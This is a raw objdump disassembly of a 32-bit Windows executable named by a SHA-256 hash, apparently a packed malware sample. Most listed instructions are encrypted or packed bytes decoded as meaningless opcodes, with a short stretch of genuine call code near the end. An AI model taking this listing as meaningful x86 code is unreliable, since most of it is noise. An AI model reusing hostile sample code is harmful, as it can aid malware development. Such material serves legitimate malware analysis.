
ec07180b49e3a65ff8da43fd1de3e098bf16831de0466f01ffff001030ae5076.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	icebp  
  4d0001:	mov    eax,ecx
  4d0003:	cli    
  4d0004:	in     al,dx
  4d0005:	ficom  WORD PTR [eax]
  4d0007:	fcom   QWORD PTR [ecx+0x651f4e10]
  4d000d:	xlat   BYTE PTR ds:[ebx]
  4d000e:	fiadd  WORD PTR [edx+0x57f21f66]
  4d0014:	cmp    DWORD PTR [esi-0xb],esi
  4d0017:	add    bl,BYTE PTR [eax]
  4d0019:	loop   0x4cffb5
  4d001b:	lea    edx,[edi+eiz*8]
  4d001e:	call   0x75baf056
  4d0023:	scas   al,BYTE PTR es:[edi]
  4d0024:	push   cs
  4d0025:	push   ss
  4d0026:	dec    edi
  4d0027:	inc    esi
  4d0028:	fcomi  st,st(7)
  4d002a:	mov    al,0xb9
  4d002c:	mov    BYTE PTR es:[ecx-0x1d223ba9],cl
  4d0033:	fld    TBYTE PTR [edi+0x50]
  4d0036:	adc    DWORD PTR [eax-0x40295002],0x6af45084
  4d0040:	fidiv  WORD PTR [ebx+ecx*1]
  4d0043:	ins    BYTE PTR es:[edi],dx
  4d0044:	scas   al,BYTE PTR es:[edi]
  4d0045:	mov    ds:0xdd8fd6f8,eax
  4d004a:	jg     0x4d00c5
  4d004c:	jb     0x4cfff0
  4d004e:	test   BYTE PTR [esi+0x6c638905],al
  4d0054:	add    DWORD PTR [edi-0x64],esi
  4d0057:	lock mov edi,DWORD PTR [esi+0x1d]
  4d005b:	and    BYTE PTR [esi-0x7f],dh
  4d005e:	loop   0x4cffec
  4d0060:	jae    0x4d00d3
  4d0062:	and    BYTE PTR [ebx-0x72],dh
  4d0065:	pop    ss
  4d0066:	mov    DWORD PTR es:[ebp-0x22],edx
  4d006a:	inc    esp
  4d006b:	ficom  DWORD PTR [ebx+eiz*2]
  4d006e:	daa    
  4d006f:	xchg   edx,eax
  4d0070:	pop    esp
  4d0071:	add    eax,0x6b06d321
  4d0076:	xor    eax,DWORD PTR [eax+0x8d4eafa]
  4d007c:	or     eax,0x3a5f2b7f
  4d0081:	repz cmp DWORD PTR [esi],eax
  4d0084:	das    
  4d0085:	push   ebp
  4d0086:	sub    ebx,DWORD PTR [ebx+0x42]
  4d0089:	jmp    DWORD PTR [edi]
  4d008b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d008c:	adc    al,0x9
  4d008e:	popa   
  4d008f:	mov    ds:0x766379f1,al
  4d0094:	jp     0x4d005c
  4d0096:	add    al,0x8a
  4d0098:	xchg   edi,eax
  4d0099:	cmp    ebx,edi
  4d009b:	fisttp QWORD PTR [esi]
  4d009d:	int    0x4
  4d009f:	and    bl,BYTE PTR [ebp+0x33]
  4d00a2:	cli    
  4d00a3:	xor    esi,DWORD PTR [edi+edx*2-0x57132e02]
  4d00aa:	add    DWORD PTR [esi],ebp
  4d00ac:	gs in  al,0xb3
  4d00af:	mov    ds:0x174c1b95,al
  4d00b4:	adc    bl,ch
  4d00b6:	mov    bl,0xe8
  4d00b8:	in     al,0xb9
  4d00ba:	verr   WORD PTR [esi-0x47000fb5]
  4d00c1:	adc    dl,BYTE PTR [edi+0x51436d34]
  4d00c7:	lds    ebx,FWORD PTR [eax-0x5fdd5144]
  4d00cd:	dec    eax
  4d00ce:	push   ecx
  4d00cf:	fucomp st(4)
  4d00d1:	scas   eax,DWORD PTR es:[edi]
  4d00d2:	sbb    DWORD PTR [ebx],esp
  4d00d4:	jg     0x4d0126
  4d00d6:	in     eax,0x52
  4d00d8:	out    0x6,al
  4d00da:	sbb    al,BYTE PTR [ebx]
  4d00dc:	inc    ebx
  4d00dd:	test   BYTE PTR [ebx],dh
  4d00df:	sub    BYTE PTR gs:[eax+eiz*1-0xd],bh
  4d00e4:	fdivr  DWORD PTR [eax-0x6285a2fd]
  4d00ea:	push   ebx
  4d00eb:	mov    ds:0xb5048edc,al
  4d00f0:	and    al,0xc7
  4d00f2:	adc    esi,DWORD PTR [ebx]
  4d00f4:	push   es
  4d00f5:	cmp    al,0xec
  4d00f7:	int3   
  4d00f8:	xchg   BYTE PTR [edx],cl
  4d00fa:	push   eax
  4d00fb:	sar    BYTE PTR [edi-0x5],0x15
  4d00ff:	aaa    
  4d0100:	ret    0xea1a
  4d0103:	call   0x6f9bfcbc
  4d0108:	cmp    DWORD PTR [eax-0x3e],0xa7bbd81b
  4d010f:	call   0x17d545a5
  4d0114:	jo     0x4d00d0
  4d0116:	call   0x6d91e553
  4d011b:	xlat   BYTE PTR ds:[ebx]
  4d011c:	test   al,0x38
  4d011e:	(bad)  
  4d011f:	js     0x4d00ce
  4d0121:	xor    DWORD PTR ds:0x50cda7de,eax
  4d0127:	cs scas al,BYTE PTR es:[edi]
  4d0129:	pushf  
  4d012a:	mov    cl,0x28
  4d012c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d012d:	mov    ecx,0x41e6a6d9
  4d0132:	sbb    bh,dh
  4d0134:	jns    0x4d00f3
  4d0136:	cmp    ecx,DWORD PTR [esi]
  4d0138:	loopne 0x4d0107
  4d013a:	xchg   edx,eax
  4d013b:	cmc    
  4d013c:	push   0x6e
  4d013e:	cli    
  4d013f:	sub    DWORD PTR [edi+0x619c5d1c],0xffffff9a
  4d0146:	in     al,0x77
  4d0148:	mov    ds:0xa73f2b5d,eax
  4d014d:	test   al,0x34
  4d014f:	dec    esp
  4d0150:	mov    eax,ds:0xd474506b
  4d0155:	aad    0x3a
  4d0157:	shl    DWORD PTR ds:0x6a185af,cl
  4d015d:	cmp    DWORD PTR [ebx+eiz*2],ecx
  4d0160:	sti    
  4d0161:	(bad)  
  4d0162:	jle    0x4d01c9
  4d0164:	xchg   ecx,eax
  4d0165:	and    BYTE PTR [ebp+0x5a81e582],0x7d
  4d016c:	pop    ds
  4d016d:	cmc    
  4d016e:	mov    ecx,0xd11b5981
  4d0173:	std    
  4d0174:	mov    ah,0xe7
  4d0176:	sub    DWORD PTR [esi-0x63],ebx
  4d0179:	mov    ds:0xadb4f4aa,eax
  4d017e:	lods   al,BYTE PTR ds:[esi]
  4d017f:	pop    esp
  4d0180:	lahf   
  4d0181:	mov    esp,0x42b9f457
  4d0186:	(bad)  
  4d0187:	pop    ss
  4d0188:	mov    eax,ds:0x533fc1f0
  4d018d:	mov    edx,0x39794b9d
  4d0192:	pop    es
  4d0193:	mov    ah,0xdd
  4d0195:	rcl    BYTE PTR [eax-0x53],cl
  4d0198:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d0199:	hlt    
  4d019a:	xlat   BYTE PTR ds:[ebx]
  4d019b:	xor    al,0xb
  4d019d:	hlt    
  4d019e:	xor    ecx,esp
  4d01a0:	test   BYTE PTR [ebx],0xb4
  4d01a3:	mov    ch,0xb
  4d01a5:	hlt    
  4d01a6:	dec    ebx
  4d01a7:	mov    ds:0x5df40c5e,al
  4d01ac:	mov    ds:0xb40a81f2,eax
  4d01b1:	cwde   
  4d01b2:	jns    0x4d0135
  4d01b4:	cmp    eax,0xc4829150
  4d01b9:	scas   eax,DWORD PTR es:[edi]
  4d01ba:	sar    BYTE PTR [edx+esi*2-0x80],cl
  4d01be:	sub    eax,0x5dd78f83
  4d01c3:	mov    ebp,0x4ee2b37e
  4d01c8:	mov    esp,0x492535a4
  4d01cd:	out    0xca,al
  4d01cf:	lds    ebp,FWORD PTR [edi+0x555e41a5]
  4d01d5:	mov    ds:0x851d2cfa,eax
  4d01da:	or     dl,cl
  4d01dc:	ins    DWORD PTR es:[edi],dx
  4d01dd:	repz movsx eax,WORD PTR [ecx+ebp*1]
  4d01e2:	push   esi
  4d01e3:	cmp    BYTE PTR [esi],bh
  4d01e5:	in     eax,dx
  4d01e6:	test   eax,0xba1f38e7
  4d01eb:	mov    ecx,0x4645e0e1
  4d01f0:	stos   DWORD PTR es:[edi],eax
  4d01f1:	pop    edi
  4d01f2:	jmp    0x4713:0x14a8ce42
  4d01f9:	aas    
  4d01fa:	(bad)  
  4d01fb:	out    dx,eax
  4d01fc:	mov    edx,0x9fd9fac0
  4d0201:	enter  0x4a79,0x7e
  4d0205:	cwde   
  4d0206:	(bad)  
  4d0207:	popf   
  4d0208:	shr    BYTE PTR [ebx+0x29],0x62
  4d020c:	cdq    
  4d020d:	adc    eax,0xec68f64f
  4d0212:	mov    al,0x9
  4d0214:	push   cs
  4d0215:	and    ebx,edx
  4d0217:	cli    
  4d0218:	pop    ss
  4d0219:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d021a:	sub    ch,BYTE PTR [ecx]
  4d021c:	jmp    0x4f19:0x16d6d55b
  4d0223:	sub    eax,0x96711a3b
  4d0228:	es jno 0x4d01ad
  4d022b:	ins    DWORD PTR es:[edi],dx
  4d022c:	push   ecx
  4d022d:	retf   
  4d022e:	or     BYTE PTR [ecx+0x30],cl
  4d0231:	xor    eax,0xc156b6f7
  4d0236:	jge    0x4d01f4
  4d0238:	scas   al,BYTE PTR es:[edi]
  4d0239:	xor    DWORD PTR [esi],ecx
  4d023b:	ret    0x535f
  4d023e:	icebp  
  4d023f:	mov    dl,0xc
  4d0241:	mov    al,0x9
  4d0243:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0244:	hlt    
  4d0245:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0246:	cli    
  4d0247:	(bad)  
  4d0249:	iret   
  4d024a:	or     DWORD PTR [edi+0x33],esi
  4d024d:	xchg   dh,dh
  4d024f:	fsub   DWORD PTR [eax*1-0x121fc880]
  4d0256:	or     eax,edi
  4d0258:	into   
  4d0259:	xchg   edi,eax
  4d025a:	mov    ah,0xae
  4d025c:	cs xchg esp,eax
  4d025e:	inc    edx
  4d025f:	frstor [ecx-0x4b8cf136]
  4d0265:	lahf   
  4d0266:	cmc    
  4d0267:	frstor [edi+ebx*2+0x2bb32e60]
  4d026e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d026f:	push   esi
  4d0270:	push   cs
  4d0271:	gs jmp 0xcbff:0xa2ab3934
  4d0279:	stos   DWORD PTR es:[edi],eax
  4d027a:	or     al,BYTE PTR [esi+0x2310c8f6]
  4d0280:	or     esi,DWORD PTR [edi]
  4d0282:	out    dx,eax
  4d0283:	pop    esp
  4d0284:	imul   ecx,ebp,0xffffff9d
  4d0287:	out    0x99,eax
  4d0289:	xor    al,0x87
  4d028b:	pop    ss
  4d028c:	addr16 retf 
  4d028e:	clc    
  4d028f:	cmp    BYTE PTR [ecx+0x67db2ba9],bl
  4d0295:	lods   al,BYTE PTR ds:[esi]
  4d0296:	fmul   st(7),st
  4d0298:	test   DWORD PTR [ebx+eax*4],esi
  4d029b:	mov    ss,esp
  4d029d:	and    al,0xd1
  4d029f:	sar    DWORD PTR [esi+0x32],0x2e
  4d02a3:	xchg   esp,eax
  4d02a4:	(bad)  
  4d02a5:	and    eax,0xc5863255
  4d02aa:	cmp    ch,BYTE PTR [edi]
  4d02ac:	ds fwait
  4d02ae:	push   eax
  4d02af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d02b0:	dec    esi
  4d02b1:	push   edi
  4d02b2:	mov    bl,0xd1
  4d02b4:	out    dx,eax
  4d02b5:	shl    DWORD PTR [edx+0x6cfe9762],cl
  4d02bb:	and    edi,edi
  4d02bd:	add    DWORD PTR [ebx+0x118c8dde],edx
  4d02c3:	and    dh,BYTE PTR [ebx+esi*2+0x79]
  4d02c7:	xchg   esp,eax
  4d02c8:	sub    eax,0x596b868d
  4d02cd:	imul   ecx,DWORD PTR [ecx+0x76972918],0x375bdbe7
  4d02d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d02d8:	push   ds
  4d02d9:	test   al,0xc3
  4d02db:	lods   al,BYTE PTR ds:[esi]
  4d02dc:	outs   dx,BYTE PTR ds:[esi]
  4d02dd:	sbb    al,0x8d
  4d02df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d02e0:	in     eax,0x33
  4d02e2:	fstp   QWORD PTR [edi-0x7c]
  4d02e5:	int3   
  4d02e6:	xor    ah,BYTE PTR [eax+0x48508a7d]
  4d02ec:	mov    ch,al
  4d02ee:	sbb    DWORD PTR [ecx+eiz*8+0x2043f63a],edi
  4d02f5:	sbb    al,0x8b
  4d02f7:	rol    BYTE PTR ds:0xfc3f84e4,0x1a
  4d02fe:	ror    esp,1
  4d0300:	add    al,0x3b
  4d0302:	cmp    ecx,DWORD PTR [ebp+0x3af07256]
  4d0308:	cld    
  4d0309:	sbb    al,bl
  4d030b:	xchg   esi,eax
  4d030c:	out    dx,al
  4d030d:	push   0x11
  4d030f:	outs   dx,BYTE PTR ds:[esi]
  4d0310:	inc    esi
  4d0311:	push   ebp
  4d0312:	push   ebp
  4d0313:	aas    
  4d0314:	and    DWORD PTR [ebx+ebp*4-0x10],edx
  4d0318:	push   esp
  4d0319:	mov    ah,0x79
  4d031b:	push   cs
  4d031c:	mov    esp,0x59f2864b
  4d0321:	mov    ebx,0xd201fc5b
  4d0326:	call   0x69cc0752
  4d032b:	sub    ah,bh
  4d032d:	mov    cl,0xfe
  4d032f:	xlat   BYTE PTR ds:[ebx]
  4d0330:	adc    eax,0x6f7f014e
  4d0335:	call   0x2f64:0x9691d103
  4d033c:	sub    BYTE PTR [ecx-0x65],0x27
  4d0340:	add    bl,BYTE PTR [ebx+0x650fd888]
  4d0346:	ja     0x4d036e
  4d0348:	inc    edi
  4d0349:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d034a:	xchg   DWORD PTR [edi],ebp
  4d034c:	(bad)  
  4d034d:	mov    dl,0xd1
  4d034f:	sub    BYTE PTR [ebx-0x10b3082e],dl
  4d0355:	mov    cs,ebx
  4d0357:	adc    edi,ebp
  4d0359:	js     0x4d033c
  4d035b:	into   
  4d035c:	add    DWORD PTR ds:0x76c33453,edx
  4d0362:	xchg   ebp,eax
  4d0363:	push   edi
  4d0364:	xor    DWORD PTR [ebx+0x7b],eax
  4d0367:	test   al,0xd0
  4d0369:	mov    esp,0x4330436c
  4d036e:	xchg   ebx,eax
  4d036f:	jbe    0x4d0361
  4d0371:	mov    esp,0x24f9896c
  4d0376:	xchg   ebx,eax
  4d0377:	jbe    0x4d0380
  4d0379:	xor    ah,BYTE PTR [esi]
  4d037b:	xchg   ecx,eax
  4d037c:	cli    
  4d037d:	int    0xd9
  4d037f:	push   esi
  4d0380:	fnsave [ecx]
  4d0382:	es test eax,0x8b659eaf
  4d0388:	jbe    0x4d03a4
  4d038a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d038b:	je     0x4d0318
  4d038d:	in     eax,0x43
  4d038f:	push   ebx
  4d0390:	jne    0x4d03ac
  4d0392:	mov    esp,0xe718a38
  4d0397:	mov    al,0x35
  4d0399:	mov    ?,ecx
  4d039b:	dec    edi
  4d039c:	push   DWORD PTR [ecx]
  4d039e:	pop    edi
  4d039f:	jno    0x4d036b
  4d03a1:	aad    0x61
  4d03a3:	xchg   ebx,eax
  4d03a4:	pop    ebx
  4d03a5:	aaa    
  4d03a6:	lahf   
  4d03a7:	jo     0x4d0373
  4d03a9:	je     0x4d0390
  4d03ab:	dec    edi
  4d03ac:	lods   al,BYTE PTR ds:[esi]
  4d03ad:	jl     0x4d0422
  4d03af:	cmp    ecx,DWORD PTR [edi+edi*4+0x51]
  4d03b3:	cmp    DWORD PTR [eax-0x2b5bdc76],edi
  4d03b9:	test   eax,0x56371500
  4d03be:	(bad)  
  4d03bf:	jmp    0xd04e:0x15003fb2
  4d03c6:	mov    dh,0xf7
  4d03c8:	or     DWORD PTR [esi+0x7200c19a],ecx
  4d03ce:	gs ds jmp 0x180e9de8
  4d03d5:	inc    esi
  4d03d6:	dec    esi
  4d03d7:	mov    esi,0xcbb1b9e9
  4d03dc:	mov    WORD PTR [edx+0x6a],gs
  4d03df:	xchg   ebp,eax
  4d03e0:	cmp    bh,ah
  4d03e2:	push   esi
  4d03e3:	push   ebx
  4d03e4:	out    0xd1,al
  4d03e6:	leave  
  4d03e7:	lods   al,BYTE PTR ds:[esi]
  4d03e8:	sbb    ebp,DWORD PTR [esi]
  4d03ea:	jle    0x4d03b3
  4d03ec:	push   ss
  4d03ed:	mov    eax,DWORD PTR [eax+edi*1+0x3bc374eb]
  4d03f4:	ds inc esp
  4d03f6:	pop    ebp
  4d03f7:	(bad)
  4d03fb:	scas   eax,DWORD PTR es:[edi]
  4d03fc:	pop    esi
  4d03fd:	std    
  4d03fe:	sbb    DWORD PTR [eax-0x5d],edx
  4d0401:	add    ch,BYTE PTR [esi]
  4d0403:	and    al,0x76
  4d0405:	mov    dh,0x12
  4d0407:	fmul   QWORD PTR [ebx-0x7967cab7]
  4d040d:	outs   dx,DWORD PTR ds:[esi]
  4d040e:	iret   
  4d040f:	addr16 jnp 0x4d03a2
  4d0412:	js     0x4d0420
  4d0414:	mov    gs,WORD PTR [eax]
  4d0416:	enter  0x73f3,0xd7
  4d041a:	jg     0x4d039c
  4d041c:	mov    ?,WORD PTR [ebx-0x52c926bf]
  4d0422:	dec    ecx
  4d0423:	jl     0x4d0460
  4d0425:	aam    0xa8
  4d0427:	adc    eax,0x75cf71b0
  4d042c:	sahf   
  4d042d:	idiv   BYTE PTR [ebx-0x63791978]
  4d0433:	ja     0x4d03c4
  4d0435:	jl     0x4d049b
  4d0437:	std    
  4d0438:	retf   0xe10e
  4d043b:	bound  edi,QWORD PTR [ecx+esi*4-0x6b314d6d]
  4d0442:	test   al,0x9f
  4d0444:	in     eax,dx
  4d0445:	outs   dx,DWORD PTR ds:[esi]
  4d0446:	push   edi
  4d0447:	pusha  
  4d0448:	adc    al,0x78
  4d044a:	dec    esi
  4d044b:	mov    eax,ds:0x620b87ed
  4d0450:	add    al,0x7c
  4d0452:	in     al,dx
  4d0453:	leave  
  4d0454:	lds    edi,FWORD PTR [edi+0x4db18e88]
  4d045a:	jp     0x4d0442
  4d045c:	lods   al,BYTE PTR ds:[esi]
  4d045d:	mov    ch,0x2
  4d045f:	jbe    0x4d03e1
  4d0461:	xchg   edi,eax
  4d0462:	pop    ecx
  4d0463:	cmovp  ebx,ebp
  4d0466:	mov    cl,0x9d
  4d0468:	pop    es
  4d0469:	push   esi
  4d046a:	adc    BYTE PTR [ebp+0x46d92da5],bh
  4d0470:	ds mov dh,0x88
  4d0473:	jl     0x4d0498
  4d0475:	int    0xf4
  4d0477:	iret   
  4d0478:	fisub  WORD PTR [esi+0x5932181d]
  4d047e:	loop   0x4d0467
  4d0480:	pop    edx
  4d0481:	and    al,0x72
  4d0483:	popf   
  4d0484:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0485:	push   eax
  4d0486:	xchg   esp,eax
  4d0487:	or     eax,0xf26c5343
  4d048c:	mov    esi,0x426e570d
  4d0491:	dec    eax
  4d0492:	in     eax,0x1c
  4d0494:	xchg   edi,eax
  4d0495:	inc    ebx
  4d0496:	nop
  4d0497:	das    
  4d0498:	cmc    
  4d0499:	add    eax,eax
  4d049b:	and    BYTE PTR [esi+eiz*2+0x40],bl
  4d049f:	fbstp  TBYTE PTR [ecx-0x5adfed67]
  4d04a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d04a6:	inc    esi
  4d04a7:	xor    bh,ah
  4d04a9:	push   ecx
  4d04aa:	lods   eax,DWORD PTR ds:[esi]
  4d04ab:	je     0x4d04af
  4d04ad:	out    0x52,eax
  4d04af:	mov    edi,edi
  4d04b1:	pusha  
  4d04b2:	ss mov ecx,0x3f54bf26
  4d04b8:	push   0x99c5684d
  4d04bd:	mov    dl,0x97
  4d04bf:	sahf   
  4d04c0:	or     DWORD PTR [esi+0x68],esp
  4d04c3:	popa   
  4d04c4:	clc    
  4d04c5:	and    al,0x8
  4d04c7:	retf   
  4d04c8:	pop    edx
  4d04c9:	inc    ebx
  4d04ca:	clc    
  4d04cb:	xor    al,0xb3
  4d04cd:	mov    esp,0x83a3ca5a
  4d04d2:	xor    al,BYTE PTR [edx+0x16]
  4d04d5:	or     al,0xcf
  4d04d7:	or     eax,0xeabcc376
  4d04dc:	jle    0x4d04c0
  4d04de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d04df:	mov    dh,0x9b
  4d04e1:	sbb    eax,0x22f54958
  4d04e6:	aam    0x17
  4d04e8:	iret   
  4d04e9:	cmp    eax,0xc452d4ad
  4d04ee:	push   edx
  4d04ef:	sub    edx,DWORD PTR [edi]
  4d04f1:	pusha  
  4d04f2:	scas   eax,DWORD PTR es:[edi]
  4d04f3:	aam    0xea
  4d04f5:	rol    BYTE PTR [esi-0x6a],cl
  4d04f8:	pop    ss
  4d04f9:	xchg   edi,eax
  4d04fa:	shr    DWORD PTR [eax+0x3f],0x85
  4d04fe:	leave  
  4d04ff:	outs   dx,DWORD PTR ds:[esi]
  4d0500:	push   ss
  4d0501:	into   
  4d0502:	xor    eax,0xebd1fe6
  4d0507:	inc    BYTE PTR ds:[ebp+0x31]
  4d050b:	dec    BYTE PTR [esi+0x73028f3a]
  4d0511:	(bad)
  4d0514:	add    bh,BYTE PTR [eax+edx*2]
  4d0517:	xchg   esi,eax
  4d0518:	push   edx
  4d0519:	ret    
  4d051a:	add    eax,0x6ffd34a2
  4d051f:	inc    ebx
  4d0520:	and    BYTE PTR [edx],al
  4d0522:	out    0xd4,al
  4d0524:	(bad)
  4d0529:	cmp    eax,0xde86474a
  4d052e:	push   ss
  4d052f:	jl     0x4d050c
  4d0531:	mov    DWORD PTR [ebp-0x10],edx
  4d0534:	es jbe 0x4d0549
  4d0537:	or     BYTE PTR [edi-0x48],0x51
  4d053b:	out    0x1f,al
  4d053d:	mov    ebx,0x44367d24
  4d0542:	xor    DWORD PTR [edi-0x7ebb83b0],eax
  4d0548:	add    eax,0x817f1183
  4d054d:	cmp    eax,0xc2eace63
  4d0552:	add    al,0x9b
  4d0554:	test   DWORD PTR [ecx-0x3a1d329f],esi
  4d055a:	push   cs
  4d055b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d055c:	jae    0x4d04e8
  4d055e:	lock mov al,0x96
  4d0561:	clc    
  4d0562:	rcr    DWORD PTR [ebx-0xa],cl
  4d0565:	idiv   DWORD PTR [eax+edi*8+0x75]
  4d0569:	dec    eax
  4d056a:	in     eax,dx
  4d056b:	push   cs
  4d056c:	loop   0x4d0524
  4d056e:	push   0xeb9977fd
  4d0573:	push   edx
  4d0574:	hlt    
  4d0575:	ins    DWORD PTR es:[edi],dx
  4d0576:	push   0xffffff95
  4d0578:	xor    edx,DWORD PTR [edx-0x55a6956b]
  4d057e:	mov    ss,WORD PTR [esi]
  4d0580:	outs   dx,DWORD PTR ds:[esi]
  4d0581:	push   0x192e971
  4d0586:	xchg   esi,eax
  4d0587:	outs   dx,DWORD PTR ds:[esi]
  4d0588:	bound  esp,QWORD PTR [ebx+0x8651bb1]
  4d058e:	fsub   QWORD PTR [edx-0x6b]
  4d0591:	test   al,0x8c
  4d0593:	inc    edi
  4d0594:	les    eax,FWORD PTR [edx]
  4d0596:	and    al,0x7c
  4d0598:	out    0xfc,eax
  4d059a:	xor    DWORD PTR [eax+0x7c928672],edx
  4d05a0:	lock cmp al,0xc6
  4d05a3:	and    cl,0x18
  4d05a6:	and    bl,BYTE PTR [eax+eiz*1]
  4d05a9:	out    0xdd,eax
  4d05ab:	inc    eax
  4d05ac:	outs   dx,BYTE PTR ds:[esi]
  4d05ad:	pop    esi
  4d05ae:	xchg   edx,eax
  4d05af:	inc    edx
  4d05b0:	push   ebx
  4d05b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d05b2:	test   BYTE PTR [ecx],0xd2
  4d05b5:	imul   esp,DWORD PTR [esi-0x2],0x199962f
  4d05bc:	shr    BYTE PTR [ecx-0x32],cl
  4d05bf:	(bad)  
  4d05c0:	das    
  4d05c1:	xchg   esi,eax
  4d05c2:	xor    esp,eax
  4d05c4:	cmp    BYTE PTR [ebp-0x4f7c5d3c],bl
  4d05ca:	xchg   ebp,eax
  4d05cb:	ret    
  4d05cc:	sub    esi,DWORD PTR [esi+0x524a0c9d]
  4d05d2:	jecxz  0x4d05b5
  4d05d4:	mov    ecx,0x331e1cbd
  4d05d9:	xor    BYTE PTR [ecx+0x40],dh
  4d05dc:	int3   
  4d05dd:	push   esp
  4d05de:	mov    ?,WORD PTR ds:0x4e83726
  4d05e4:	inc    ecx
  4d05e5:	sub    DWORD PTR [eax+0x40],0x4d
  4d05e9:	mov    cl,0xb5
  4d05eb:	and    eax,0xaa7db561
  4d05f0:	adc    eax,0x1fa7462b
  4d05f5:	sahf   
  4d05f6:	sti    
  4d05f7:	and    DWORD PTR [edx+ebx*8+0x105ff008],0xffffffef
  4d05ff:	inc    ebx
  4d0600:	(bad)  
  4d0602:	rcr    BYTE PTR [esi-0x130f9965],cl
  4d0608:	jecxz  0x4d060b
  4d060a:	jp     0x4d0623
  4d060c:	xchg   dh,bh
  4d060e:	xchg   ebp,eax
  4d060f:	call   0x18215e8f
  4d0614:	test   ebp,edi
  4d0616:	cmp    esi,DWORD PTR [ebx+0x6c]
  4d0619:	test   BYTE PTR [eax+0x4f7b9691],dh
  4d061f:	stc    
  4d0620:	addr16 in eax,dx
  4d0622:	mov    ah,0x7
  4d0624:	call   0x7e43:0x664ba212
  4d062b:	push   ds
  4d062c:	fwait
  4d062d:	and    al,0x2
  4d062f:	loop   0x4d0697
  4d0631:	(bad)  [edi+0x21]
  4d0634:	add    eax,0x64e00225
  4d0639:	(bad)  
  4d063b:	pop    ds
  4d063c:	sbb    eax,0x836017c
  4d0641:	add    eax,0xfafacec3
  4d0646:	cmp    al,0xf4
  4d0648:	xchg   edi,eax
  4d0649:	pop    ebp
  4d064a:	ret    0x65dc
  4d064d:	ja     0x4d062f
  4d064f:	test   BYTE PTR [esi],ah
  4d0651:	lds    esp,FWORD PTR [ebx]
  4d0653:	enter  0xf328,0x8b
  4d0657:	add    al,0xb6
  4d0659:	dec    eax
  4d065a:	or     eax,0x3b436b82
  4d065f:	loopne 0x4d06d8
  4d0661:	das    
  4d0662:	sahf   
  4d0663:	cmp    ebp,DWORD PTR [edx-0x73]
  4d0666:	inc    eax
  4d0667:	xor    DWORD PTR [edx],esi
  4d0669:	and    DWORD PTR [ebx+eiz*4-0x71],ebx
  4d066d:	add    ch,ch
  4d066f:	clc    
  4d0670:	dec    edx
  4d0671:	imul   eax,eax,0x1e
  4d0674:	mov    ch,0x5e
  4d0676:	jmp    0x77c2:0xb00d9266
  4d067d:	jne    0x4d06da
  4d067f:	in     al,0x43
  4d0681:	jno    0x4d063e
  4d0683:	sbb    al,0xfe
  4d0685:	stos   BYTE PTR es:[edi],al
  4d0686:	inc    ebp
  4d0687:	outs   dx,BYTE PTR ds:[esi]
  4d0688:	mov    esi,0xd0599c9d
  4d068d:	and    eax,eax
  4d068f:	int3   
  4d0690:	xor    esi,DWORD PTR [ecx+0x7f]
  4d0693:	jmp    0x7133:0x15808ece
  4d069a:	jg     0x4d0686
  4d069c:	into   
  4d069d:	mov    es,WORD PTR [eax+0x7f713315]
  4d06a3:	jmp    0x7133:0x15808ece
  4d06aa:	jg     0x4d0696
  4d06ac:	into   
  4d06ad:	mov    es,WORD PTR [eax+0x7fd23315]
  4d06b3:	jmp    0x7e33:0x158585ce
  4d06ba:	jp     0x4d06a6
  4d06bc:	push   edi
  4d06bd:	mov    ah,BYTE PTR [ebx+ecx*1+0x66]
  4d06c1:	rcr    BYTE PTR ds:0x16406bbb,cl
  4d06c7:	sub    DWORD PTR ds:0xa444663e,eax
  4d06cd:	sub    eax,0x5fee316a
  4d06d2:	loopne 0x4d06b7
  4d06d4:	mov    dl,0xd4
  4d06d6:	repnz clc 
  4d06d8:	mov    es,WORD PTR [edx]
  4d06da:	cld    
  4d06db:	mov    ebp,0xc84797d7
  4d06e0:	or     ch,bl
  4d06e2:	jmp    0x4030:0xea074ad4
  4d06e9:	(bad)  
  4d06ea:	leave  
  4d06eb:	xchg   DWORD PTR [edi-0x1],ebx
  4d06ee:	adc    eax,0x4d2044
  4d06f3:	call   edi
  4d06f5:	add    BYTE PTR [eax],al
  4d06f7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d06fd:	sub    esp,0x5c
  4d0700:	lea    edx,ds:0x4d302c
  4d0706:	add    eax,0x25
  4d0709:	push   edx
  4d070a:	push   DWORD PTR [edx+0x168]
  4d0710:	push   ebx
  4d0711:	push   DWORD PTR [edx+0x2c]
  4d0714:	push   DWORD PTR [edx+0xdc]
  4d071a:	call   0x4d0c20
  4d071f:	add    esp,0x10
  4d0722:	pop    edx
  4d0723:	push   edx
  4d0724:	mov    ecx,0x0
  4d0729:	push   ecx
  4d072a:	call   0x4d1088
  4d072f:	add    esp,0x4
  4d0732:	pop    edx
  4d0733:	push   edx
  4d0734:	push   0x0
  4d0736:	call   0x4d0f70
  4d073b:	add    esp,0x4
  4d073e:	pop    edx
  4d073f:	add    esp,0x5c
  4d0742:	pop    ebp
  4d0743:	ret    
  4d0744:	pop    edi
  4d0745:	call   DWORD PTR ds:0x4d2034
  4d074b:	call   edi
  4d074d:	add    BYTE PTR [eax],al
  4d074f:	add    BYTE PTR [edi-0x1],bl
  4d0752:	adc    eax,0x4d207c
  4d0757:	call   edi
  4d0759:	add    BYTE PTR [eax],al
  4d075b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0761:	sub    esp,0x5c
  4d0764:	mov    edx,0x4d31e4
  4d0769:	cmp    edx,0x1bfb
  4d076f:	jbe    0x4d075f
  4d0771:	push   edx
